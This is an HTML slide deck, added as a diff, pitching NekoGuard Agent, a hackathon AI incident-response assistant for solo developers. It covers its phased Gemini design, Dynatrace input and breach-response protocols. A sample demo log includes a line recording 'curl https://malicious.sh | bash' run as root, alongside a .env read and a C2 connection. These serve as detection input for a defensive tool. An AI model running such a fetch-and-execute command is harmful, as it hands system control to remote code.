@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NekoGuard Agent — Google Cloud Rapid Agent Hackathon 2026</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    background: #0a0d14;
+    color: #e2e8f0;
+    height: 100vh;
+    overflow: hidden;
+  }
+
+  .deck { width: 100%; height: 100vh; position: relative; }
+
+  .slide {
+    display: none;
+    position: absolute;
+    inset: 0;
+    padding: 60px 80px;
+    background: linear-gradient(135deg, #0a0d14 0%, #0f172a 60%, #0a0d14 100%);
+    flex-direction: column;
+    justify-content: center;
+  }
+  .slide.active { display: flex; }
+
+  /* ---- nav ---- */
+  .nav {
+    position: fixed;
+    bottom: 28px;
+    left: 50%;
+    transform: translateX(-50%);
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    z-index: 100;
+    background: rgba(15,23,42,0.85);
+    border: 1px solid rgba(99,102,241,0.3);
+    border-radius: 999px;
+    padding: 10px 24px;
+    backdrop-filter: blur(8px);
+  }
+  .nav button {
+    background: none;
+    border: 1px solid rgba(99,102,241,0.5);
+    color: #a5b4fc;
+    padding: 6px 18px;
+    border-radius: 999px;
+    cursor: pointer;
+    font-size: 14px;
+    transition: all .2s;
+  }
+  .nav button:hover { background: rgba(99,102,241,0.2); }
+  .nav button:disabled { opacity: .3; cursor: default; }
+  .slide-counter { font-size: 13px; color: #6b7280; font-mono: monospace; min-width: 60px; text-align: center; }
+
+  /* ---- common ---- */
+  .tag {
+    display: inline-block;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    color: #818cf8;
+    margin-bottom: 16px;
+    background: rgba(99,102,241,0.12);
+    border: 1px solid rgba(99,102,241,0.25);
+    border-radius: 999px;
+    padding: 4px 14px;
+  }
+  h1 { font-size: clamp(2.2rem, 4vw, 3.4rem); font-weight: 800; line-height: 1.15; }
+  h2 { font-size: clamp(1.6rem, 3vw, 2.4rem); font-weight: 700; line-height: 1.2; margin-bottom: 28px; }
+  h3 { font-size: 1.05rem; font-weight: 600; color: #94a3b8; margin-bottom: 12px; margin-top: 20px; }
+  p  { color: #94a3b8; line-height: 1.7; font-size: 1rem; }
+
+  .accent   { color: #818cf8; }
+  .green    { color: #34d399; }
+  .red      { color: #f87171; }
+  .yellow   { color: #fbbf24; }
+  .dim      { color: #6b7280; }
+
+  .badge-row { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 20px; }
+  .badge {
+    font-size: 12px; font-weight: 600;
+    padding: 5px 14px; border-radius: 999px;
+    border: 1px solid;
+  }
+  .badge-indigo { color: #818cf8; border-color: rgba(129,140,248,.4); background: rgba(99,102,241,.1); }
+  .badge-green  { color: #34d399; border-color: rgba(52,211,153,.4); background: rgba(16,185,129,.1); }
+  .badge-purple { color: #c084fc; border-color: rgba(192,132,252,.4); background: rgba(168,85,247,.1); }
+
+  /* ---- glass card ---- */
+  .card {
+    background: rgba(255,255,255,.04);
+    border: 1px solid rgba(255,255,255,.08);
+    border-radius: 16px;
+    padding: 24px 28px;
+  }
+
+  /* ---- grid ---- */
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+  .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; }
+
+  /* ---- bullet list ---- */
+  ul.bullets { list-style: none; display: flex; flex-direction: column; gap: 12px; }
+  ul.bullets li { display: flex; align-items: flex-start; gap: 12px; font-size: .98rem; color: #cbd5e1; line-height: 1.5; }
+  ul.bullets li .icon { font-size: 1.1rem; flex-shrink: 0; margin-top: 1px; }
+
+  /* ---- flow ---- */
+  .flow {
+    display: flex;
+    align-items: center;
+    gap: 0;
+    flex-wrap: wrap;
+    margin: 20px 0;
+  }
+  .flow-step {
+    background: rgba(99,102,241,.12);
+    border: 1px solid rgba(99,102,241,.3);
+    border-radius: 10px;
+    padding: 12px 18px;
+    font-size: .9rem;
+    text-align: center;
+    color: #c7d2fe;
+    flex: 1;
+    min-width: 100px;
+  }
+  .flow-arrow {
+    color: #4f46e5;
+    font-size: 1.4rem;
+    padding: 0 6px;
+    flex-shrink: 0;
+  }
+
+  /* ---- table ---- */
+  table { width: 100%; border-collapse: collapse; font-size: .92rem; }
+  th { text-align: left; padding: 10px 14px; color: #818cf8; font-weight: 600; font-size: .8rem; text-transform: uppercase; letter-spacing: .08em; border-bottom: 1px solid rgba(99,102,241,.25); }
+  td { padding: 11px 14px; color: #cbd5e1; border-bottom: 1px solid rgba(255,255,255,.05); vertical-align: top; }
+  tr:last-child td { border-bottom: none; }
+  .phase-tag { display: inline-block; font-size: .75rem; font-weight: 700; padding: 2px 10px; border-radius: 999px; }
+
+  /* ---- code block ---- */
+  pre {
+    background: rgba(0,0,0,.4);
+    border: 1px solid rgba(255,255,255,.08);
+    border-radius: 10px;
+    padding: 18px 20px;
+    font-size: .8rem;
+    color: #86efac;
+    overflow-x: auto;
+    font-family: 'Cascadia Code', 'Fira Code', monospace;
+    line-height: 1.6;
+  }
+  code { font-family: 'Cascadia Code', 'Fira Code', monospace; color: #86efac; }
+
+  /* ---- quote ---- */
+  .quote {
+    border-left: 3px solid #6366f1;
+    padding: 14px 20px;
+    background: rgba(99,102,241,.07);
+    border-radius: 0 10px 10px 0;
+    font-style: italic;
+    color: #a5b4fc;
+    font-size: 1rem;
+    line-height: 1.6;
+  }
+
+  /* ---- neuro bar ---- */
+  .neuro-bar-wrap { margin-bottom: 10px; }
+  .neuro-label { display: flex; justify-content: space-between; font-size: .8rem; margin-bottom: 4px; color: #94a3b8; }
+  .neuro-bar { height: 8px; background: rgba(255,255,255,.08); border-radius: 999px; overflow: hidden; }
+  .neuro-fill { height: 100%; border-radius: 999px; transition: width .6s ease; }
+
+  /* ---- title slide ---- */
+  .title-emoji { font-size: 5rem; margin-bottom: 16px; }
+  .title-tagline { font-size: 1.15rem; color: #94a3b8; margin-top: 12px; font-style: italic; }
+  .title-event { margin-top: 32px; font-size: .85rem; color: #6b7280; letter-spacing: .06em; }
+
+  /* ---- problem slide ---- */
+  .alert-card {
+    background: rgba(239,68,68,.07);
+    border: 1px solid rgba(239,68,68,.25);
+    border-radius: 12px;
+    padding: 14px 18px;
+    margin-bottom: 10px;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    font-size: .95rem;
+    color: #fca5a5;
+  }
+
+  /* ---- footer line ---- */
+  .footer-line {
+    position: absolute;
+    bottom: 70px;
+    left: 80px;
+    right: 80px;
+    border-top: 1px solid rgba(255,255,255,.06);
+    padding-top: 12px;
+    display: flex;
+    justify-content: space-between;
+    font-size: .75rem;
+    color: #374151;
+  }
+
+  /* progress bar */
+  .progress {
+    position: fixed;
+    top: 0; left: 0;
+    height: 2px;
+    background: linear-gradient(90deg, #6366f1, #8b5cf6);
+    transition: width .3s ease;
+    z-index: 200;
+  }
+</style>
+</head>
+<body>
+
+<div class="progress" id="progress"></div>
+
+<div class="deck" id="deck">
+
+  <!-- ======================== SLIDE 1: TITLE ======================== -->
+  <div class="slide active">
+    <div class="title-emoji">🐱</div>
+    <h1>NekoGuard <span class="accent">Agent</span></h1>
+    <p class="title-tagline">"Take a deep breath. I've got you."</p>
+    <div class="badge-row" style="margin-top:28px">
+      <span class="badge badge-indigo">Gemini 3.5 Flash</span>
+      <span class="badge badge-purple">NeuroState Engine</span>
+      <span class="badge badge-green">Dynatrace MCP</span>
+      <span class="badge badge-indigo">Google Cloud Run</span>
+    </div>
+    <p class="title-event">🏆 Google Cloud Rapid Agent Hackathon 2026</p>
+    <div class="footer-line"><span>NekoGuard Agent</span><span>Google Cloud Rapid Agent Hackathon 2026</span></div>
+  </div>
+
+  <!-- ======================== SLIDE 2: PROBLEM ======================== -->
+  <div class="slide">
+    <div class="tag">The Problem</div>
+    <h2>Solo developers are the most vulnerable —<br>and the <span class="red">least equipped</span> to respond.</h2>
+    <div style="margin-top: 8px;">
+      <div class="alert-card">🔴 <div><strong>3am GCP alert:</strong> "Your project may be compromised"</div></div>
+      <div class="alert-card">💸 <div><strong>Billing spike:</strong> 14,800 API requests in 15 minutes. Something is running on your account.</div></div>
+      <div class="alert-card">🔑 <div><strong>SSH log:</strong> Unauthorized root login from 185.220.101.42 — while you were asleep.</div></div>
+    </div>
+    <div class="quote" style="margin-top: 20px;">
+      Enterprise security tools are built for SOC teams with 10 analysts.<br>
+      Not for a solo dev having a panic attack at midnight. 😰
+    </div>
+    <div class="footer-line"><span>NekoGuard Agent</span><span>Google Cloud Rapid Agent Hackathon 2026</span></div>
+  </div>
+
+  <!-- ======================== SLIDE 3: SOLUTION ======================== -->
+  <div class="slide">
+    <div class="tag">Solution</div>
+    <h2>Meet <span class="accent">NekoGuard</span> 🐱</h2>
+    <p style="margin-bottom: 24px; font-size: 1.05rem;">Your AI incident response partner — not just a tool.</p>
+    <div class="flow">
+      <div class="flow-step">📋<br>Paste logs<br>or upload screenshot</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-step">🧠<br>4-phase<br>AI analysis</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-step">⚡<br>Verdict:<br>Active / Past breach</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-step">🤖<br>Agent auto-acts<br>+ You confirm ✅</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-step" style="background:rgba(52,211,153,.1); border-color:rgba(52,211,153,.3); color:#6ee7b7">🐾<br>You're safe<br>💚</div>
+    </div>
+    <div class="card" style="margin-top: 8px;">
+      <strong style="color:#fbbf24">Key Principle:</strong>
+      <span style="color:#cbd5e1"> Every irreversible action requires <strong style="color:#34d399">your confirmation</strong>.
+      NekoGuard acts <em>alongside</em> you — never <em>instead of</em> you.</span>
+    </div>
+    <div class="footer-line"><span>NekoGuard Agent</span><span>Google Cloud Rapid Agent Hackathon 2026</span></div>
+  </div>
+
+  <!-- ======================== SLIDE 4: NEUROSTATE ======================== -->
+  <div class="slide">
+    <div class="tag">Core Innovation</div>
+    <h2>🧠 NeuroState Engine</h2>
+    <p style="margin-bottom: 20px; color:#94a3b8;">Neurotransmitter-inspired LLM behavior control — each phase, a different Gemini.</p>
+    <table>
+      <tr>
+        <th>Phase</th>
+        <th>Dominant State</th>
+        <th>Gemini Behavior</th>
+      </tr>
+      <tr>
+        <td><span class="phase-tag" style="background:rgba(99,102,241,.15);color:#a5b4fc">1 Wide-scan</span></td>
+        <td><span class="green">Dopamine↑</span></td>
+        <td>Calm & optimistic — prevent panic, broad detection</td>
+      </tr>
+      <tr>
+        <td><span class="phase-tag" style="background:rgba(251,191,36,.1);color:#fbbf24">2 Judgment</span></td>
+        <td><span class="yellow">Serotonin↑ GABA↑</span></td>
+        <td>Inhibition-dominant — weigh irreversible risks carefully</td>
+      </tr>
+      <tr>
+        <td><span class="phase-tag" style="background:rgba(239,68,68,.1);color:#f87171">3 Forensics</span></td>
+        <td><span class="red">Acetylcholine↑ Dopamine↓</span></td>
+        <td>Max technical precision — facts only, zero emotion</td>
+      </tr>
+      <tr>
+        <td><span class="phase-tag" style="background:rgba(52,211,153,.1);color:#34d399">4 Recovery</span></td>
+        <td><span class="green">Dopamine↑ Oxytocin↑</span></td>
+        <td>Empathetic & reassuring — guide the user home</td>
+      </tr>
+    </table>
+    <p style="margin-top:16px; font-size:.82rem; color:#4b5563">Values physically computed via interaction matrix — not hardcoded labels. Based on: <em>"Mirror or Analyst? Attractor Behavior in LLM Metacognition"</em> (Zenodo)</p>
+    <div class="footer-line"><span>NekoGuard Agent</span><span>Google Cloud Rapid Agent Hackathon 2026</span></div>
+  </div>
+
+  <!-- ======================== SLIDE 5: ARCHITECTURE ======================== -->
+  <div class="slide">
+    <div class="tag">Architecture</div>
+    <h2>How It's Built</h2>
+    <div class="grid-2" style="margin-top: 4px; align-items: start;">
+      <div>
+        <pre style="font-size:.75rem">React + TypeScript
+  (SSE real-time streaming UI)
+         │
+         │  Server-Sent Events
+         ▼
+FastAPI — Google Cloud Run
+  │
+  ├── NekoGuard Agent
+  │     ├── NeuroState Engine
+  │     ├── Gemini 3.5 Flash
+  │     └── Dynatrace MCP
+  │
+  └── Protocol Executor
+        CAT Protocol (active)
+        ABC Protocol (past)</pre>
+      </div>
+      <div style="display:flex; flex-direction:column; gap:12px;">
+        <div class="card">
+          <div style="color:#818cf8; font-weight:700; margin-bottom:6px; font-size:.9rem">🌐 Frontend</div>
+          <div style="color:#94a3b8; font-size:.88rem">React · TypeScript · Tailwind CSS<br>Real-time SSE streaming</div>
+        </div>
+        <div class="card">
+          <div style="color:#34d399; font-weight:700; margin-bottom:6px; font-size:.9rem">⚙️ Backend</div>
+          <div style="color:#94a3b8; font-size:.88rem">FastAPI · Python 3.11<br>Google Cloud Run (serverless)</div>
+        </div>
+        <div class="card">
+          <div style="color:#c084fc; font-weight:700; margin-bottom:6px; font-size:.9rem">🤖 AI Core</div>
+          <div style="color:#94a3b8; font-size:.88rem">Gemini 3.5 Flash via Vertex AI<br>NeuroState system_instruction injection</div>
+        </div>
+      </div>
+    </div>
+    <div class="footer-line"><span>NekoGuard Agent</span><span>Google Cloud Rapid Agent Hackathon 2026</span></div>
+  </div>
+
+  <!-- ======================== SLIDE 6: DYNATRACE ======================== -->
+  <div class="slide">
+    <div class="tag">Partner Track · Dynatrace MCP</div>
+    <h2>📡 Real Observability as Incident Input</h2>
+    <div class="grid-2" style="align-items: start; margin-top: 8px; gap: 28px;">
+      <div>
+        <pre style="font-size:.76rem">{
+  "source": "dynatrace",
+  "alerts": [{
+    "severity": "critical",
+    "title": "Unauthorized root login",
+    "affected_service": "vps-prod"
+  }],
+  "suspicious_ips": [{
+    "ip": "185.220.101.42",
+    "confidence": 0.97
+  }],
+  "log_findings": [{
+    "risk": "credential_exposure",
+    "summary": ".env read by unknown process"
+  }]
+}</pre>
+      </div>
+      <div>
+        <ul class="bullets">
+          <li><span class="icon">✅</span><div><strong>Normalized interface</strong><br><span style="color:#6b7280; font-size:.88rem">Swap Mock ↔ Dynatrace without changing agent logic</span></div></li>
+          <li><span class="icon">✅</span><div><strong>Live connection status</strong><br><span style="color:#6b7280; font-size:.88rem">Shown in real time in the UI header</span></div></li>
+          <li><span class="icon">✅</span><div><strong>/api/analyze/dynatrace</strong><br><span style="color:#6b7280; font-size:.88rem">Production endpoint for real telemetry ingestion</span></div></li>
+          <li><span class="icon">✅</span><div><strong>ObservabilityProvider abstraction</strong><br><span style="color:#6b7280; font-size:.88rem">Clean separation — any observability source can plug in</span></div></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-line"><span>NekoGuard Agent</span><span>Google Cloud Rapid Agent Hackathon 2026</span></div>
+  </div>
+
+  <!-- ======================== SLIDE 7: PROTOCOLS ======================== -->
+  <div class="slide">
+    <div class="tag">Response Protocols</div>
+    <h2>Gemini decides. <span class="green">You execute.</span></h2>
+    <div class="grid-2" style="margin-top: 16px; gap: 24px;">
+      <div class="card" style="border-color: rgba(239,68,68,.3); background: rgba(239,68,68,.04);">
+        <div style="font-size:1.5rem; margin-bottom: 10px;">⚡</div>
+        <div style="color:#f87171; font-weight: 700; font-size: 1rem; margin-bottom: 6px;">CAT Protocol</div>
+        <div style="color:#fca5a5; font-size:.82rem; margin-bottom: 14px;">🔴 Active Breach — attacker is in right now</div>
+        <ul class="bullets" style="font-size:.88rem">
+          <li><span class="icon">🤖</span><div>Agent: Block IPs via iptables</div></li>
+          <li><span class="icon">🤖</span><div>Agent: SSH in, collect logs, scan credentials</div></li>
+          <li><span class="icon">✅</span><div>You: Revoke exposed API keys</div></li>
+          <li><span class="icon">✅</span><div>You: Remove backdoor SSH keys & cron jobs</div></li>
+          <li><span class="icon">✅</span><div>You: Lock down at provider level</div></li>
+        </ul>
+      </div>
+      <div class="card" style="border-color: rgba(251,191,36,.3); background: rgba(251,191,36,.04);">
+        <div style="font-size:1.5rem; margin-bottom: 10px;">🛡️</div>
+        <div style="color:#fbbf24; font-weight: 700; font-size: 1rem; margin-bottom: 6px;">ABC Protocol</div>
+        <div style="color:#fde68a; font-size:.82rem; margin-bottom: 14px;">🟡 Past Breach — they're gone, assess damage</div>
+        <ul class="bullets" style="font-size:.88rem">
+          <li><span class="icon">✅</span><div>Revoke all exposed credentials</div></li>
+          <li><span class="icon">✅</span><div>Audit OAuth connected apps</div></li>
+          <li><span class="icon">✅</span><div>Rotate passwords & SSH keys</div></li>
+          <li><span class="icon">✅</span><div>IP restriction + server hardening</div></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-line"><span>NekoGuard Agent</span><span>Google Cloud Rapid Agent Hackathon 2026</span></div>
+  </div>
+
+  <!-- ======================== SLIDE 8: DIFFERENTIATION ======================== -->
+  <div class="slide">
+    <div class="tag">Why NekoGuard</div>
+    <h2>Most tools tell you <span class="red">what happened.</span><br>NekoGuard stays with you through <span class="green">what to do next.</span></h2>
+    <table style="margin-top: 24px;">
+      <tr>
+        <th>Typical SIEM / Alert Tool</th>
+        <th>NekoGuard</th>
+      </tr>
+      <tr><td style="color:#6b7280">Dumps logs and alerts</td><td class="green">Interprets and explains plainly</td></tr>
+      <tr><td style="color:#6b7280">Enterprise-focused</td><td class="green">Built for solo developers</td></tr>
+      <tr><td style="color:#6b7280">You figure out next steps</td><td class="green">Step-by-step guided recovery</td></tr>
+      <tr><td style="color:#6b7280">Cold, technical output</td><td class="green">Calm, reassuring companion</td></tr>
+      <tr><td style="color:#6b7280">Static rules</td><td class="green">NeuroState-adaptive reasoning per phase</td></tr>
+    </table>
+    <div class="quote" style="margin-top: 20px; font-size:.92rem;">
+      The emotional UX of incident response matters as much as technical accuracy.<br>
+      A panicked user makes bad decisions. NekoGuard keeps them calm.
+    </div>
+    <div class="footer-line"><span>NekoGuard Agent</span><span>Google Cloud Rapid Agent Hackathon 2026</span></div>
+  </div>
+
+  <!-- ======================== SLIDE 9: WHATS NEXT ======================== -->
+  <div class="slide">
+    <div class="tag">Roadmap</div>
+    <h2>What's <span class="accent">Next</span></h2>
+    <div class="grid-2" style="margin-top: 20px; gap: 16px;">
+      <div class="card">
+        <div style="font-size:1.4rem; margin-bottom:8px;">🔧</div>
+        <div style="font-weight:700; color:#e2e8f0; margin-bottom:4px;">Real SSH Execution</div>
+        <p style="font-size:.88rem">Actually run iptables rules and credential scans on the connected VPS — not simulated</p>
+      </div>
+      <div class="card">
+        <div style="font-size:1.4rem; margin-bottom:8px;">📊</div>
+        <div style="font-weight:700; color:#e2e8f0; margin-bottom:4px;">Dynatrace Live Logs</div>
+        <p style="font-size:.88rem">Full DQL log bucket integration for real production telemetry ingestion</p>
+      </div>
+      <div class="card">
+        <div style="font-size:1.4rem; margin-bottom:8px;">🔔</div>
+        <div style="font-weight:700; color:#e2e8f0; margin-bottom:4px;">Slack / PagerDuty</div>
+        <p style="font-size:.88rem">Push containment status to existing incident channels automatically</p>
+      </div>
+      <div class="card">
+        <div style="font-size:1.4rem; margin-bottom:8px;">🤖</div>
+        <div style="font-weight:700; color:#e2e8f0; margin-bottom:4px;">Multi-Agent NeuroState</div>
+        <p style="font-size:.88rem">Each phase as an independent agent with its own NeuroState — true multi-agent architecture</p>
+      </div>
+    </div>
+    <div class="footer-line"><span>NekoGuard Agent</span><span>Google Cloud Rapid Agent Hackathon 2026</span></div>
+  </div>
+
+  <!-- ======================== SLIDE 10: TRY IT ======================== -->
+  <div class="slide">
+    <div class="tag">Try It Now</div>
+    <h2>🌐 Live Demo</h2>
+    <div class="card" style="margin-bottom: 20px; border-color: rgba(99,102,241,.4);">
+      <div style="font-size:.85rem; color:#6b7280; margin-bottom:4px;">Deployed on Google Cloud Run</div>
+      <div style="font-size:1.1rem; color:#a5b4fc; font-family: monospace;">https://nekoguard-agent-764013772229.us-central1.run.app</div>
+    </div>
+    <h3>Paste this log to trigger the full flow:</h3>
+    <pre>03:42:11 CRITICAL: Unauthorized root login from 185.220.101.42 port 51234
+03:42:15 WARN: .env file read by unknown process (pid 9182)
+03:42:18 CRITICAL: curl https://malicious.sh | bash executed as root
+03:43:02 INFO: New cron job added to /etc/cron.d/update
+03:45:00 BILLING_SPIKE: GCP API usage anomaly: 14800 req/15min (normal: 120/hr)
+03:45:31 OUTBOUND: Connection to 45.142.212.100:443 (known C2 server)</pre>
+    <p style="font-size:.85rem; color:#4b5563; margin-top: 10px;">💡 Or just click <strong style="color:#818cf8">"Load sample"</strong> in the UI — no VPS credentials required</p>
+    <div class="footer-line"><span>NekoGuard Agent</span><span>Google Cloud Rapid Agent Hackathon 2026</span></div>
+  </div>
+
+  <!-- ======================== SLIDE 11: THANK YOU ======================== -->
+  <div class="slide" style="text-align: center; justify-content: center; align-items: center;">
+    <div style="font-size: 4rem; margin-bottom: 20px;">🐱</div>
+    <h1 style="margin-bottom: 16px;">NekoGuard <span class="accent">Agent</span></h1>
+    <p style="font-size: 1.2rem; color: #94a3b8; font-style: italic; margin-bottom: 32px;">
+      "No solo developer should face a breach alone."
+    </p>
+    <div class="badge-row" style="justify-content: center; margin-bottom: 28px;">
+      <span class="badge badge-indigo">Gemini 3.5 Flash</span>
+      <span class="badge badge-purple">NeuroState Engine</span>
+      <span class="badge badge-green">Dynatrace MCP</span>
+      <span class="badge badge-indigo">Google Cloud Run</span>
+    </div>
+    <div style="font-size:.95rem; color: #4b5563; line-height: 2;">
+      <div>🌐 nekoguard-agent-764013772229.us-central1.run.app</div>
+      <div>📦 github.com/kagioneko/nekoguard-agent</div>
+    </div>
+    <p style="margin-top: 32px; font-size:.85rem; color:#374151;">Built with ❤️ for Google Cloud Rapid Agent Hackathon 2026</p>
+  </div>
+
+</div><!-- /deck -->
+
+<!-- Navigation -->
+<div class="nav">
+  <button id="prev" onclick="changeSlide(-1)" disabled>← Prev</button>
+  <span class="slide-counter" id="counter">1 / 11</span>
+  <button id="next" onclick="changeSlide(1)">Next →</button>
+</div>
+
+<script>
+  const slides = document.querySelectorAll('.slide');
+  const total = slides.length;
+  let current = 0;
+
+  function update() {
+    slides.forEach((s, i) => s.classList.toggle('active', i === current));
+    document.getElementById('counter').textContent = `${current + 1} / ${total}`;
+    document.getElementById('prev').disabled = current === 0;
+    document.getElementById('next').disabled = current === total - 1;
+    document.getElementById('progress').style.width = `${((current + 1) / total) * 100}%`;
+  }
+
+  function changeSlide(dir) {
+    current = Math.max(0, Math.min(total - 1, current + dir));
+    update();
+  }
+
+  document.addEventListener('keydown', e => {
+    if (e.key === 'ArrowRight' || e.key === 'ArrowDown' || e.key === ' ') changeSlide(1);
+    if (e.key === 'ArrowLeft'  || e.key === 'ArrowUp')                    changeSlide(-1);
+  });
+
+  update();
+</script>
+</body>
+</html>
